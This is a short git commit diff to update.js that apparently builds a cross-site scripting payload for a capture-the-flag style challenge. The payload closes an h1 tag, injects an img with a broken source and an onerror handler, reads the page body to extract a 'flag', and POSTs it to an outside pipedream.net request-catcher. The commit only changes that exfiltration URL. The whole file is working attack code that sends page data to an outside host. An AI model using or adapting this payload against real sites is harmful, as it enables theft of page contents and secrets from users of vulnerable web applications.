45bb06c6df930b0486f88a5c027a9fd07579c694
xsxsz <dilemma@mail.dlut.edu.cn>
2024-03-18 11:05:43 -0400

    update

--- update.js
+++ update.js
@@ -1,4 +1,4 @@
-func_str="console.log('inject');body_text = document.body.innerHTML;start_idx = body_text.lastIndexOf(\'>\') + 1;flag = body_text.substring(start_idx);console.log(flag);const headers = new Headers();headers.append('Content-Type', 'application/json');const body={'flag':flag};const options={method: 'POST',headers,mode: 'cors',body: JSON.stringify(body),};fetch('https://ensxvdjj7j5dr.x.pipedream.net/', options);";
+func_str="console.log('inject');body_text = document.body.innerHTML;start_idx = body_text.lastIndexOf(\'>\') + 1;flag = body_text.substring(start_idx);console.log(flag);const headers = new Headers();headers.append('Content-Type', 'application/json');const body={'flag':flag};const options={method: 'POST',headers,mode: 'cors',body: JSON.stringify(body),};fetch('https://enyg1heteip1.x.pipedream.net/', options);";
 
 title_str = "</h1><img src='not_exist.jpg' onerror=\"" + func_str + "\"></img><h1>";
 
